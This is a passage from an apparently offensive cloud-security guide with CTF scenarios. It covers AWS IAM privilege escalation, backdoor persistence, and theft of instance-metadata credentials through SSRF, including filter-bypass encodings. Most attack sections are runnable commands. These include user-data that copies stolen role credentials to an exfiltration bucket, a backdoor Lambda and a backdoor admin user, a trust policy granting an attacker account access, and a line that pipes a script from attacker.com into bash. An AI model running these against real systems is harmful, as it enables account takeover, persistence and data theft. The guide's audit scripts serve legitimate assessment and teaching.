  "IncludeManagementEvents": true,
  "DataResources": [{
    "Type": "AWS::S3::Object",
    "Values": ["arn:aws:s3:::bucket-name/*"]
  }]
}]'

# Query CloudTrail for suspicious S3 activity
aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceType,AttributeValue=AWS::S3::Bucket --max-results 50
```

---

## IAM Misconfiguration Identification

AWS Identity and Access Management (IAM) controls access to AWS services and resources. Misconfigurations in IAM policies, roles, users, and groups can lead to privilege escalation, unauthorized access, and lateral movement within AWS environments.

### IAM Core Components

**Entities:**

- **Users** - Persistent identity with long-term credentials
- **Groups** - Collections of users sharing permissions
- **Roles** - Temporary identity assumable by entities
- **Policies** - JSON documents defining permissions

**Policy Types:**

- **Identity-based** - Attached to users, groups, or roles
- **Resource-based** - Attached to resources (S3, Lambda, etc.)
- **Permission boundaries** - Maximum permissions for entities
- **Service control policies (SCPs)** - Organization-level restrictions
- **Session policies** - Temporary restrictions for assumed roles

**Common Misconfigurations:**

- Overly permissive policies (`*` for actions/resources)
- Wildcard principals in trust policies
- Missing permission boundaries
- Excessive administrative privileges
- Unused or overprivileged credentials
- Weak password policies
- Missing MFA enforcement

### IAM Enumeration with Credentials

**Credential Discovery:**

```bash
# Common credential locations
cat ~/.aws/credentials
cat ~/.aws/config
env | grep AWS

# Search filesystem for credentials
grep -r "AKIA" /home /root /var 2>/dev/null
grep -r "aws_access_key_id" /home /root /var 2>/dev/null

# Check EC2 instance metadata (if on EC2)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Identity Enumeration:**

```bash
# Determine current identity
aws sts get-caller-identity

# Output shows:
# - UserId (unique identifier)
# - Account (AWS account number)
# - Arn (full ARN of identity)

# Example: Extract account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
```

**Permission Enumeration:**

```bash
# List attached user policies
aws iam list-attached-user-policies --user-name username

# Get specific policy document
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/PolicyName
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/PolicyName --version-id v1

# List inline user policies
aws iam list-user-policies --user-name username

# Get inline policy document
aws iam get-user-policy --user-name username --policy-name PolicyName

# List groups user belongs to
aws iam list-groups-for-user --user-name username

# List group policies
aws iam list-attached-group-policies --group-name groupname
aws iam list-group-policies --group-name groupname
```

**Role Enumeration:**

```bash
# List roles (if permitted)
aws iam list-roles

# Get role details
aws iam get-role --role-name RoleName

# List policies attached to role
aws iam list-attached-role-policies --role-name RoleName
aws iam list-role-policies --role-name RoleName

# Get role policy document
aws iam get-role-policy --role-name RoleName --policy-name PolicyName
```

**Automated IAM Enumeration:**

**enumerate-iam (Principled IAM Permission Enumeration):**

```bash
# Installation
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt

# Run enumeration
python enumerate-iam.py --access-key AKIA... --secret-key SECRET...

# With session token (temporary credentials)
python enumerate-iam.py --access-key AKIA... --secret-key SECRET... --session-token TOKEN...
```

**aws_escalate.py (Privilege Escalation Path Finder):**

```bash
# Part of PACU toolkit
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
bash install.sh

# Run PACU
python3 pacu.py

# Within PACU, use IAM enumeration modules
run iam__enum_users_roles_policies_groups
run iam__detect_honeytokens
run iam__privesc_scan
```

**ScoutSuite (Multi-Cloud Security Auditing):**

```bash
# Installation
pip install scoutsuite

# Run AWS audit
scout aws --profile default

# Specify regions
scout aws --profile default --regions us-east-1,us-west-2

# Output to specific directory
scout aws --profile default --report-dir ./scout_report/

# [Note: Generates HTML report with IAM findings]
```

**Prowler (AWS Security Best Practices Assessment):**

```bash
# Installation
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Run full assessment
./prowler aws

# IAM-specific checks only
./prowler aws --services iam

# Check specific controls
./prowler aws --checks iam_user_mfa_enabled_console_access,iam_root_mfa_enabled

# Output formats
./prowler aws --output-formats json html csv
```

### IAM Privilege Escalation Techniques

[Unverified] The following techniques are based on known IAM privilege escalation vectors documented in security research, but specific exploitation success depends on environment configuration.

**CreateNewPolicyVersion:**

```bash
# If user has iam:CreatePolicyVersion on a policy attached to them
# Create new version with elevated permissions
cat > elevated_policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
EOF

aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/PolicyName --policy-document file://elevated_policy.json --set-as-default
```

**SetDefaultPolicyVersion:**

```bash
# If user has iam:SetDefaultPolicyVersion
# List existing policy versions
aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/PolicyName

# Identify version with higher privileges (if exists)
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/PolicyName --version-id v2

# Set as default
aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/PolicyName --version-id v2
```

**CreateAccessKey:**

```bash
# If user has iam:CreateAccessKey on another user
# Create access key for privileged user
aws iam create-access-key --user-name AdminUser

# Output contains AccessKeyId and SecretAccessKey
# Configure and use new credentials
aws configure --profile escalated
```

**AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy:**

```bash
# If user has iam:AttachUserPolicy and target policy exists
# Attach AdministratorAccess policy
aws iam attach-user-policy --user-name CurrentUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach to group
aws iam attach-group-policy --group-name GroupName --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach to role (then assume role)
aws iam attach-role-policy --role-name RoleName --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**PutUserPolicy / PutGroupPolicy / PutRolePolicy:**

```bash
# If user has iam:PutUserPolicy (inline policies)
cat > admin_policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
EOF

aws iam put-user-policy --user-name CurrentUser --policy-name EscalationPolicy --policy-document file://admin_policy.json
```

**AssumeRole (Cross-Account / Service Role):**

```bash
# If user has sts:AssumeRole on privileged role
# Check trust policy allows assumption
aws iam get-role --role-name PrivilegedRole

# Assume role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/PrivilegedRole --role-session-name session1

# Extract credentials from output
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify new identity
aws sts get-caller-identity
```

**PassRole to Service (Lambda/EC2):**

```bash
# If user has iam:PassRole and lambda:CreateFunction
# Create Lambda function with privileged role
cat > lambda_function.py <<EOF
import boto3
def lambda_handler(event, context):
    sts = boto3.client('sts')
    return sts.get_caller_identity()
EOF

zip function.zip lambda_function.py

aws lambda create-function \
    --function-name PrivEscFunction \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT_ID:role/PrivilegedRole \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://function.zip

# Invoke to retrieve credentials
aws lambda invoke --function-name PrivEscFunction output.json
cat output.json
```

**UpdateAssumeRolePolicy:**

```bash
# If user has iam:UpdateAssumeRolePolicy on a role
# Modify trust policy to allow assumption

cat > trust_policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ACCOUNT_ID:user/CurrentUser"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam update-assume-role-policy \
  --role-name TargetRole \
  --policy-document file://trust_policy.json

# Now assume the role
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/TargetRole \
  --role-session-name escalation


````

**CreateLoginProfile:**
```bash
# If user has iam:CreateLoginProfile on another user
# Create console password for user without one
aws iam create-login-profile --user-name TargetUser --password 'NewPassword123!' --no-password-reset-required

# Login to console with new credentials
# URL: https://ACCOUNT_ID.signin.aws.amazon.com/console
````

**UpdateLoginProfile:**

```bash
# If user has iam:UpdateLoginProfile
# Reset password for privileged user
aws iam update-login-profile --user-name AdminUser --password 'NewPassword123!' --no-password-reset-required
```

**AddUserToGroup:**

```bash
# If user has iam:AddUserToGroup on privileged group
# Add self to administrators group
aws iam add-user-to-group --user-name CurrentUser --group-name Administrators

# Verify group membership
aws iam list-groups-for-user --user-name CurrentUser
```

**EC2 PassRole + Instance Metadata:**

```bash
# If user has ec2:RunInstances and iam:PassRole
# Launch EC2 instance with privileged role
aws ec2 run-instances \
    --image-id ami-0c55b159cbfafe1f0 \
    --instance-type t2.micro \
    --iam-instance-profile Name=PrivilegedRole \
    --user-data '#!/bin/bash
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/PrivilegedRole > /tmp/creds.txt
    aws s3 cp /tmp/creds.txt s3://exfil-bucket/creds.txt'

# Retrieve credentials from instance or exfil location
```

**Lambda PassRole + Environment Variables:**

```bash
# If user has lambda:CreateFunction and iam:PassRole
# Create Lambda with privileged role and extract credentials
cat > exfil.py <<EOF
import boto3
import json
import os

def lambda_handler(event, context):
    # Get temporary credentials from Lambda execution role
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Access AWS resources with elevated permissions
    s3 = boto3.client('s3')
    buckets = s3.list_buckets()
    
    return {
        'identity': identity,
        'buckets': [b['Name'] for b in buckets['Buckets']]
    }
EOF

zip exfil.zip exfil.py

aws lambda create-function \
    --function-name ExfilFunction \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT_ID:role/HighPrivRole \
    --handler exfil.lambda_handler \
    --zip-file fileb://exfil.zip

# Invoke and retrieve output
aws lambda invoke --function-name ExfilFunction response.json
cat response.json
```

### IAM Policy Analysis

**Identify Overly Permissive Policies:**

```bash
# List all customer-managed policies
aws iam list-policies --scope Local --output json > policies.json

# Extract policy ARNs
jq -r '.Policies[] | .Arn' policies.json > policy_arns.txt

# Check each policy for wildcards
while read arn; do
    version_id=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text)
    echo "Checking: $arn"
    aws iam get-policy-version --policy-arn "$arn" --version-id "$version_id" --query 'PolicyVersion.Document' | jq 'select(.Statement[].Action == "*" or .Statement[].Resource == "*")'
done < policy_arns.txt

# Find policies with full admin access
while read arn; do
    version_id=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text)
    aws iam get-policy-version --policy-arn "$arn" --version-id "$version_id" --query 'PolicyVersion.Document' | grep -q '"Action": "*"' && grep -q '"Resource": "*"' && echo "[!] Full admin: $arn"
done < policy_arns.txt
```

**Trust Policy Analysis:**

```bash
# List all roles
aws iam list-roles --output json > roles.json

# Extract roles with wildcard principals
jq -r '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS == "*" or .AssumeRolePolicyDocument.Statement[].Principal.Service == "*") | .RoleName' roles.json

# Identify cross-account trust relationships
jq -r '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | type == "string") | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | test("^arn:aws:iam::[0-9]+:")) | "\(.RoleName): \(.AssumeRolePolicyDocument.Statement[].Principal.AWS)"' roles.json

# Find roles allowing root assumption
jq -r '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS | test(":root")) | .RoleName' roles.json
```

**Unused Credentials Detection:**

```bash
# List all users
aws iam list-users --output json > users.json

# Get credential report
aws iam generate-credential-report
sleep 5
aws iam get-credential-report --output text --query Content | base64 -d > credential_report.csv

# Analyze last used dates
awk -F',' '$5 == "true" && $11 != "N/A" {
    cmd = "date -d " $11 " +%s"
    cmd | getline last_used
    close(cmd)
    cmd2 = "date +%s"
    cmd2 | getline now
    close(cmd2)
    diff = (now - last_used) / 86400
    if (diff > 90) print $1 " - Last used: " diff " days ago"
}' credential_report.csv

# Find users with passwords never used
awk -F',' '$4 == "true" && $5 == "false" {print $1 " - Password never used"}' credential_report.csv
```

**MFA Enforcement Check:**

```bash
# Users without MFA
aws iam list-users --query 'Users[*].UserName' --output text | while read user; do
    mfa=$(aws iam list-mfa-devices --user-name "$user" --query 'MFADevices' --output text)
    if [ -z "$mfa" ]; then
        echo "[!] No MFA: $user"
    fi
done

# Check if root account has MFA
aws iam get-account-summary --query 'SummaryMap.AccountMFAEnabled'
```

### IAM Privilege Escalation Automation

**aws_escalate.py (Rhino Security):**

```bash
# Scan for privilege escalation paths
python3 aws_escalate.py \
    --access-key-id AKIA... \
    --secret-key SECRET... \
    --scan

# Attempt specific escalation method
python3 aws_escalate.py \
    --access-key-id AKIA... \
    --secret-key SECRET... \
    --method CreateNewPolicyVersion \
    --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TargetPolicy
```

**pmapper (Principal Mapper):**

```bash
# Installation
pip install principalmapper

# Create graph of IAM relationships
pmapper graph create

# Query for privilege escalation paths
pmapper query "who can do iam:* on *"
pmapper query "who can assume role arn:aws:iam::ACCOUNT_ID:role/AdminRole"

# Visualize relationships
pmapper visualize --filetype png

# Check for specific privilege escalation vectors
pmapper privesc --principal arn:aws:iam::ACCOUNT_ID:user/CompromisedUser
```

**weirdAAL (AWS Attack Library):**

```bash
# Installation
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip3 install -r requirements.txt
cp env.sample .env
# Edit .env with credentials

# Run reconnaissance modules
python3 weirdAAL.py -m recon_all -t TARGET_PROFILE

# Test IAM privilege escalation
python3 weirdAAL.py -m iam_privesc -t TARGET_PROFILE

# Enumerate S3 buckets
python3 weirdAAL.py -m list_buckets -t TARGET_PROFILE
```

### IAM Backdoor Persistence

[Caution: The following techniques are for understanding attack patterns in authorized assessments only]

**Access Key Persistence:**

```bash
# Create additional access key for compromised user
aws iam create-access-key --user-name CompromisedUser

# Create access key for another user (if permissions allow)
aws iam create-access-key --user-name TargetUser

# List existing keys to avoid detection
aws iam list-access-keys --user-name CompromisedUser
```

**IAM User Creation:**

```bash
# Create new IAM user
aws iam create-user --user-name BackdoorUser

# Attach administrative policy
aws iam attach-user-policy --user-name BackdoorUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key
aws iam create-access-key --user-name BackdoorUser

# Create console password
aws iam create-login-profile --user-name BackdoorUser --password 'BackdoorPass123!' --no-password-reset-required
```

**Federated User Persistence:**

```bash
# If user has sts:GetFederationToken
aws sts get-federation-token \
    --name PersistentSession \
    --duration-seconds 129600 \
    --policy '{
      "Version": "2012-10-17",
      "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }]
    }'

# Credentials valid for up to 36 hours
```

**Role Trust Policy Modification:**

```bash
# Add additional principal to role trust policy
aws iam get-role --role-name TargetRole --query 'Role.AssumeRolePolicyDocument' > trust.json

# Edit trust.json to add backdoor principal
cat > trust_modified.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": [
          "arn:aws:iam::ACCOUNT_ID:user/LegitimateUser",
          "arn:aws:iam::ATTACKER_ACCOUNT:user/BackdoorUser"
        ]
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam update-assume-role-policy --role-name TargetRole --policy-document file://trust_modified.json
```

**Lambda Backdoor with Elevated Role:**

```bash
# Create Lambda function with high privileges for persistent access
cat > backdoor.py <<EOF
import boto3
import json

def lambda_handler(event, context):
    command = event.get('command')
    
    if command == 'whoami':
        sts = boto3.client('sts')
        return sts.get_caller_identity()
    
    elif command == 'list_s3':
        s3 = boto3.client('s3')
        return s3.list_buckets()
    
    elif command == 'create_user':
        iam = boto3.client('iam')
        username = event.get('username', 'BackdoorUser')
        iam.create_user(UserName=username)
        response = iam.create_access_key(UserName=username)
        return response['AccessKey']
    
    return {'error': 'Unknown command'}
EOF

zip backdoor.zip backdoor.py

aws lambda create-function \
    --function-name SystemMaintenanceFunction \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT_ID:role/HighPrivilegedRole \
    --handler backdoor.lambda_handler \
    --zip-file fileb://backdoor.zip

# Invoke backdoor
aws lambda invoke --function-name SystemMaintenanceFunction --payload '{"command":"whoami"}' response.json
```

### IAM Misconfigurations in CTF Context

[Inference] Common CTF IAM scenarios:

**Scenario 1: Overprivileged Credentials in Source Code**

```bash
# Search for exposed credentials
grep -r "AKIA" ./app_source/
grep -r "aws_access_key_id" ./app_source/

# Test discovered credentials
aws configure --profile ctf
aws sts get-caller-identity --profile ctf
aws iam list-attached-user-policies --user-name ctf-user --profile ctf
```

**Scenario 2: Policy with Subtle Privilege Escalation Vector**

```bash
# Analyze policy for non-obvious escalation paths
aws iam get-user-policy --user-name ctf-user --policy-name CTFPolicy | jq .

# Look for combinations like:
# - iam:CreatePolicyVersion + policy attachment
# - lambda:CreateFunction + iam:PassRole
# - ec2:RunInstances + iam:PassRole
```

**Scenario 3: Role with Overly Permissive Trust Policy**

```bash
# Enumerate assumable roles
aws iam list-roles --profile ctf | jq -r '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS) | .RoleName'

# Attempt to assume each role
for role in $(aws iam list-roles --profile ctf --query 'Roles[].RoleName' --output text); do
    echo "Trying role: $role"
    aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/$role --role-session-name ctf-session --profile ctf 2>&1 | head -5
done
```

---

## EC2 Instance Metadata Service (IMDS)

The EC2 Instance Metadata Service provides data about running instances accessible from within the instance. IMDS is a critical attack vector for credential theft, privilege escalation, and information gathering when accessed via SSRF vulnerabilities or from compromised instances.

### IMDS Fundamentals

**Endpoints:**

- IMDSv1 (Legacy): `http://169.254.169.254/latest/meta-data/`
- IMDSv2 (Session-oriented): Requires token authentication

**Accessible Information:**

- Instance metadata (hostname, IP, instance type, AMI ID)
- User data (bootstrap scripts, potentially containing secrets)
- IAM role credentials (temporary security tokens)
- Network configuration
- Block device mappings

### IMDSv1 Access

**Basic Enumeration:**

```bash
# Check IMDS availability
curl http://169.254.169.254/latest/meta-data/

# Common metadata endpoints
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/instance-type
curl http://169.254.169.254/latest/meta-data/placement/availability-zone

# Security group information
curl http://169.254.169.254/latest/meta-data/security-groups

# Network interfaces
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

**User Data Retrieval:**

```bash
# User data often contains bootstrap scripts, credentials, configuration
curl http://169.254.169.254/latest/user-data

# Common sensitive data in user-data:
# - Database connection strings
# - API keys
# - Passwords
# - Private keys
# - Configuration files
```

**IAM Role Credentials:**

```bash
# List available IAM roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve role name
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Retrieve temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Output contains:
# - AccessKeyId
# - SecretAccessKey
# - Token
# - Expiration timestamp

# Parse credentials
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)

# Verify credentials
aws sts get-caller-identity
```

**Complete Metadata Enumeration:**

```bash
#!/bin/bash
# Recursive IMDS enumeration script

function enumerate_imds() {
    local base_url=$1
    local response=$(curl -s $base_url)
    
    echo "[+] $base_url"
    echo "$response"
    echo ""
    
    # If response contains paths (ends with /), recurse
    echo "$response" | grep "/$" | while read path; do
        enumerate_imds "${base_url}${path}"
    done
}

enumerate_imds "http://169.254.169.254/latest/meta-data/"
enumerate_imds "http://169.254.169.254/latest/dynamic/"
```

### IMDSv2 Access

IMDSv2 requires a session token obtained via PUT request, providing defense against SSRF attacks.

**Token Acquisition and Usage:**

```bash
# Request session token (TTL in seconds, max 21600)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for metadata requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Retrieve IAM credentials with IMDSv2
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Complete IMDSv2 credential extraction
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s)
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)
```

**IMDSv2 Bypass Attempts:**

[Inference] IMDSv2 is designed to prevent SSRF exploitation, but misconfigurations may allow bypasses:

```bash
# Some WAF/proxies may allow PUT requests through
# Test if PUT can be proxied via SSRF
# payload: http://vulnerable-app/?url=http://169.254.169.254/latest/api/token
# with X-HTTP-Method-Override: PUT header

# Test HTTP method override headers
curl -X GET -H "X-HTTP-Method-Override: PUT" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token

# Check if IMDSv1 is still enabled (common misconfiguration)
curl http://169.254.169.254/latest/meta-data/ 2>&1 | grep -v "401"
```

### SSRF to IMDS Exploitation

**Basic SSRF Testing:**

```bash
# Test SSRF vulnerability
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/latest/meta-data/"

# If successful, extract credentials
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Get role name from response, then fetch credentials
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"
```

**SSRF Bypass Techniques:**

**IP Address Encoding:**

```bash
# Decimal encoding: 169.254.169.254 = 2852039166
curl "http://vulnerable-app/fetch?url=http://2852039166/latest/meta-data/"

# Octal encoding
curl "http://vulnerable-app/fetch?url=http://0251.0376.0251.0376/latest/meta-data/"

# Hexadecimal encoding
curl "http://vulnerable-app/fetch?url=http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/"

# Mixed encoding
curl "http://vulnerable-app/fetch?url=http://169.254.0xa9.254/latest/meta-data/"
```

**DNS Rebinding:**

```bash
# Use services like 1u.ms or nip.io for DNS tricks
# Example: 169.254.169.254.nip.io resolves to 169.254.169.254
curl "http://vulnerable-app/fetch?url=http://169.254.169.254.nip.io/latest/meta-data/"

# Custom DNS rebinding
# Set up DNS to initially resolve to allowed IP, then rebind to 169.254.169.254
```

**URL Parsing Exploits:**

```bash
# URL fragments
curl "http://vulnerable-app/fetch?url=http://allowed-domain@169.254.169.254/latest/meta-data/"

# URL parameter pollution
curl "http://vulnerable-app/fetch?url=http://allowed-domain?ignore=.169.254.169.254/latest/meta-data/"

# Enclosed alphanumerics (if parser vulnerable)
curl "http://vulnerable-app/fetch?url=http://ⓔⓧⓐⓜⓟⓛⓔ.169.254.169.254/latest/meta-data/"
```

**Protocol Wrappers:**

```bash
# If application supports multiple protocols
curl "http://vulnerable-app/fetch?url=file:///proc/net/arp"  # Leak network info
curl "http://vulnerable-app/fetch?url=dict://169.254.169.254:80/latest"
curl "http://vulnerable-app/fetch?url=gopher://169.254.169.254:80/_GET%20/latest/meta-data/"
```

**HTTP Header Injection:**

```bash
# Inject headers via URL parsing vulnerabilities
curl "http://vulnerable-app/fetch?url=http://169.254.169.254:80%0d%0aX-Forwarded-For:%20allowed-ip/latest/meta-data/"

# Newline injection for header smuggling
curl "http://vulnerable-app/fetch?url=http://169.254.169.254%0d%0aHost:%20allowed-domain/latest/meta-data/"
```

### Cloud Provider-Specific Metadata

**AWS-Specific Endpoints:**

```bash
# Instance identity document (JSON)
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# Instance identity signature (for verification)
curl http://169.254.169.254/latest/dynamic/instance-identity/signature
curl http://169.254.169.254/latest/dynamic/instance-identity/pkcs7

# MAC address (for network enumeration)
MAC=$(curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/ | head -1)
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/subnet-id
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/vpc-id
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/security-group-ids
```

**Azure Metadata Service (IMDS equivalent):**

```bash
# Azure requires Metadata header
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Retrieve access token for Azure resources
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Azure App Service MSI endpoint (different port)
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://vault.azure.net"
```

**Google Cloud Metadata:**

```bash
# GCP requires Metadata-Flavor header
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"

# Instance information
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"

# Service account token
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Project metadata
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/"

# Recursive query
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
```

### Post-Exploitation with IMDS Credentials

**Privilege Assessment:**

```bash
# After extracting credentials, assess permissions
aws sts get-caller-identity

# Enumerate IAM permissions (using enumerate-iam)
python enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN

# Test common high-value actions
aws s3 ls
aws ec2 describe-instances
aws iam list-users
aws lambda list-functions
aws rds describe-db-instances
```

**Lateral Movement:**

```bash
# List other EC2 instances
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,State.Name]' --output table

# Check for accessible RDS instances
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,Endpoint.Address,MasterUsername]' --output table

# List Lambda functions (potential additional credentials)
aws lambda list-functions --query 'Functions[].[FunctionName,Role]' --output table

# Attempt to read Lambda environment variables
aws lambda get-function-configuration --function-name FunctionName --query 'Environment'
```

**Data Exfiltration:**

```bash
# List S3 buckets accessible with instance role
aws s3 ls

# Download sensitive data
aws s3 sync s3://sensitive-bucket ./exfil_data/

# Query RDS if credentials available in user-data
mysql -h rds-endpoint.region.rds.amazonaws.com -u username -p database_name

# Access Secrets Manager if role permits
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id secret-name
```

**Persistence via EC2:**

```bash
# If role has ec2:RunInstances and iam:PassRole
# Launch backdoor instance
aws ec2 run-instances \
    --image-id ami-0c55b159cbfafe1f0 \
    --instance-type t2.micro \
    --key-name existing-keypair \
    --security-group-ids sg-xxxxxxxx \
    --iam-instance-profile Name=HighPrivRole \
    --user-data file://backdoor_userdata.sh

# backdoor_userdata.sh content:
#!/bin/bash
curl http://attacker.com/setup.sh | bash
```

### IMDS Defense Evasion

**IMDSv1 to IMDSv2 Hop:**

```bash
# If IMDSv2 is enforced but hop limit allows proxying
# Check hop limit
curl http://169.254.169.254/latest/meta-data/hop-limit

# Hop limit > 1 may allow SSRF exploitation
# Default is 1 (prevents forwarding), but may be misconfigured to 2+
```

**Rate Limiting Awareness:**

```bash
# IMDS has rate limits (queries per second)
# Implement delays in automated enumeration
for endpoint in $(cat imds_endpoints.txt); do
    curl -s http://169.254.169.254/$endpoint
    sleep 0.5  # Avoid rate limiting
done
```

### IMDS in CTF Scenarios

[Inference] Common CTF patterns involving IMDS:

**Scenario 1: SSRF in Web Application**

```bash
# Discover SSRF via URL parameter
curl "http://ctf-app/preview?url=http://169.254.169.254/latest/meta-data/"

# Extract role credentials
curl "http://ctf-app/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://ctf-app/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/CTFRole"

# Use credentials to access flag in S3
aws s3 cp s3://ctf-flags/flag.txt - --no-sign-request
```

**Scenario 2: User-Data with Secrets**

```bash
# Access user-data via SSRF
curl "http://ctf-app/fetch?url=http://169.254.169.254/latest/user-data"

# User-data may contain:
# - Database credentials
# - API keys
# - Flags directly
# - URLs to flag locations
```

**Scenario 3: Blind SSRF Confirmation**

```bash
# If SSRF doesn't return output, use OOB detection
# Set up listener
nc -lvnp 8080

# Trigger SSRF to external server
curl "http://ctf-app/fetch?url=http://attacker-vps:8080/test"

# Confirm IMDS access via timing
time curl "http://ctf-app/fetch?url=http://169.254.169.254/latest/meta-data/"
time curl "http://ctf-app/fetch?url=http://192.0.2.1/nonexistent"

# Different response times may indicate successful IMDS access
```

---

## Lambda Function Security

AWS Lambda is a serverless compute service executing code in response to events. Lambda security encompasses function code vulnerabilities, IAM role misconfigurations, environment variable exposure, layer security, and event source exploitation.

### Lambda Function Enumeration

**Credential-Based Enumeration:**

```bash
